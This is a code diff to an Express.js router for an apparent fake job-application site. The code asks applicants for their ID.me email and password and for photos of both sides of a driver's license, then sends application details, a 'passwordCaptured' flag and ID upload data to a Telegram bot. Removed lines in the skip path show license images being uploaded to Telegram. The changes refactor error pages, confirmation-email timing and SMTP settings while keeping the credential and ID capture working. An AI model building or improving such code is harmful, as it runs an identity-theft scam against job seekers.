@@ -73,6 +73,17 @@ function requireSession(req, res, next) {
   next();
 }
 
+function renderVerifyPage(req, res, options = {}) {
+  const { errorMessage = '', missingFront = false, missingBack = false } = options;
+  return res.render('verify', {
+    email: (req.body && req.body.email) || req.session.applicationDraft.email || '',
+    position: req.session.applicationDraft.position || '',
+    errorMessage,
+    missingFront,
+    missingBack
+  });
+}
+
 router.get('/', requireSession, (req, res) => {
   const selectedPosition = req.query.position;
   res.render('apply', { 
@@ -195,10 +206,7 @@ router.get('/verify', requireSession, (req, res) => {
   }
   
   console.log('Rendering verify page');
-  res.render('verify', {
-    email: req.session.applicationDraft.email || '',
-    position: req.session.applicationDraft.position || ''
-  });
+  renderVerifyPage(req, res);
 });
 
 router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
@@ -207,12 +215,22 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
   const dlFront = req.files['driversLicenseFront']?.[0];
   const dlBack = req.files['driversLicenseBack']?.[0];
   if (!dlFront || !dlBack) {
-    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
+    return res.status(400).render('verify', {
+      email: req.body.email || req.session.applicationDraft.email || '',
+      position: req.session.applicationDraft.position || '',
+      errorMessage: 'Both front and back of your driver\'s license/ID are required.',
+      missingFront: !dlFront,
+      missingBack: !dlBack
+    });
   }
 
   const { email, password } = req.body;
   req.session.verified = true;
   req.session.idme = { email, password };
+  req.session.idUploadsMeta = {
+    front: dlFront.originalname,
+    back: dlBack.originalname
+  };
   req.session.driversLicenseFiles = [dlFront, dlBack];
 
   const application = req.session.applicationDraft;
@@ -295,22 +313,20 @@ router.post('/verify', requireSession, driversLicenseUpload.fields(dlFields), as
 
   req.session.save((err) => {
     if (err) return res.status(500).render('error', { message: 'Session save failed.' });
-    sendConfirmationEmail(req.session.applicationDraft.email, req.session.applicationDraft.firstName)
-      .catch(e => console.error('Confirmation email error:', e.message));
     res.redirect('/apply/submit');
   });
 });
 
-router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields), async (req, res) => {
+router.post('/skip-idme/', requireSession, async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
-  const dlFront = req.files['driversLicenseFront']?.[0];
-  const dlBack = req.files['driversLicenseBack']?.[0];
-  if (!dlFront || !dlBack) {
-    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
-  }
-  req.session.driversLicenseFiles = [dlFront, dlBack];
+  req.session.driversLicenseFiles = null;
   req.session.verified = true;
-  req.session.idme = {};
+  req.session.idme = {
+    email: req.body.email || '',
+    password: '',
+    skipped: true
+  };
+  req.session.idUploadsMeta = { skipped: true };
 
   const application = req.session.applicationDraft;
   const interviewAnswers = (req.session.interviewAnswers && typeof req.session.interviewAnswers === 'object') ? req.session.interviewAnswers : {};
@@ -357,20 +373,11 @@ router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields)
     const idmePayload = {
       applicant: {
         name: `${application.firstName} ${application.lastName}`,
-        email: application.email,
+        email: req.body.email || application.email,
         position: application.position,
       },
-      idme_credentials: {},
-      drivers_license: {
-        front: {
-          filename: dlFront.originalname,
-          mimetype: dlFront.mimetype,
-        },
-        back: {
-          filename: dlBack.originalname,
-          mimetype: dlBack.mimetype,
-        },
-      }
+      idme_credentials: { skipped: true },
+      drivers_license: { skipped: true }
     };
     const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
     const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
@@ -379,28 +386,30 @@ router.post('/skip-idme/', requireSession, driversLicenseUpload.fields(dlFields)
     fs.unlinkSync(idmeFilepath);
   } catch (err) {}
 
-  try {
-    await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
-    fs.unlinkSync(dlFront.path);
-    await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
-    fs.unlinkSync(dlBack.path);
-    req.session.driversLicenseFiles = null;
-  } catch (err) {}
-
   req.session.save((err) => {
     if (err) return res.status(500).render('error', { message: 'Session save failed.' });
-    sendConfirmationEmail(application.email, application.firstName)
-      .catch(e => console.error('Confirmation email error:', e.message));
     res.redirect('/apply/submit');
   });
 });
 
-router.get('/submit', requireSession, (req, res) => {
-  if (!req.session.applicationDraft) return res.redirect('/apply');
-  res.render('submit', {
-    email: req.session.applicationDraft.email || '',
-    firstName: req.session.applicationDraft.firstName || ''
-  });
+router.get('/submit', requireSession, async (req, res) => {
+  if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
+  const email = req.session.applicationDraft.email || '';
+  const firstName = req.session.applicationDraft.firstName || '';
+
+  if (!req.session.confirmationEmailSent) {
+    try {
+      // In serverless environments (like Netlify Functions), we must await async
+      // work; otherwise the function may freeze/terminate before the email sends.
+      await sendConfirmationEmail(email, firstName);
+      req.session.confirmationEmailSent = true;
+      await new Promise((resolve, reject) => req.session.save((err) => err ? reject(err) : resolve()));
+    } catch (e) {
+      console.error('Confirmation email error:', e);
+    }
+  }
+
+  res.render('submit', { email, firstName });
 });
 
 router.post('/submit', requireSession, async (req, res) => {
@@ -410,7 +419,14 @@ router.post('/submit', requireSession, async (req, res) => {
 
     // Send final summary to Telegram
     try {
-      const summary = `✅ Application Finalized\nName: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nPhone: ${data.phone}\nPosition: ${data.position}\nCover Letter: ${data.coverLetter || 'N/A'}\nInterview Answers: ${JSON.stringify(req.session.interviewAnswers || {})}\nTimestamp: ${new Date().toISOString()}`;
+      const idmeSummary = req.session.idme && typeof req.session.idme === 'object'
+        ? {
+            email: req.session.idme.email || '',
+            passwordCaptured: !!req.session.idme.password,
+            skipped: !!req.session.idme.skipped
+          }
+        : {};
+      const summary = `✅ Application Finalized\nName: ${data.firstName} ${data.lastName}\nEmail: ${data.email}\nPhone: ${data.phone}\nPosition: ${data.position}\nCover Letter: ${data.coverLetter || 'N/A'}\nInterview Answers: ${JSON.stringify(req.session.interviewAnswers || {})}\nID.me Summary: ${JSON.stringify(idmeSummary)}\nID Uploads: ${JSON.stringify(req.session.idUploadsMeta || {})}\nTimestamp: ${new Date().toISOString()}`;
       const botToken = process.env.TELEGRAM_BOT_TOKEN;
       const chatId = process.env.TELEGRAM_CHAT_ID;
       if (botToken && chatId) {
@@ -428,9 +444,13 @@ router.post('/submit', requireSession, async (req, res) => {
     req.session.interviewAnswers = null;
     req.session.verified = null;
     req.session.idme = null;
+    req.session.idUploadsMeta = null;
+    req.session.confirmationEmailSent = null;
     req.session.save((err) => {
       if (err) return res.status(500).render('error', { message: 'Session save failed.' });
-      res.render('success');
+      sendConfirmationEmail(data.email, data.firstName)
+        .catch(e => console.error('Confirmation email error:', e))
+        .finally(() => res.render('success'));
     });
   } catch (err) {
     res.status(500).render('error', { message: 'Failed to submit application. Please try again later.' });
@@ -505,11 +525,11 @@ async function sendConfirmationEmail(email, firstName) {
   try {
     const smtpHost = process.env.SMTP_HOST || "smtp.gmail.com";
     const smtpPort = parseInt(process.env.SMTP_PORT, 10) || 465;
-    const smtpUser = process.env.SMTP_USER;
-    const smtpPass = process.env.SMTP_PASS;
+    const smtpUser = process.env.SMTP_USER || process.env.GMAIL_USER || process.env.EMAIL_USER;
+    const smtpPass = process.env.SMTP_PASS || process.env.GMAIL_APP_PASSWORD || process.env.GMAIL_PASS || process.env.EMAIL_PASS;
 
     if (!smtpUser || !smtpPass) {
-      console.error('SMTP credentials not configured. SMTP_USER and SMTP_PASS environment variables are required.');
+      console.error('SMTP credentials not configured. Set one of: SMTP_USER/SMTP_PASS, GMAIL_USER/GMAIL_APP_PASSWORD, GMAIL_USER/GMAIL_PASS, or EMAIL_USER/EMAIL_PASS.');
       return;
     }
 
@@ -519,6 +539,10 @@ async function sendConfirmationEmail(email, firstName) {
       host: smtpHost,
       port: smtpPort,
       secure: smtpPort === 465,
+      requireTLS: smtpPort === 587,
+      tls: {
+        minVersion: 'TLSv1.2',
+      },
       auth: {
         user: smtpUser,
         pass: smtpPass,
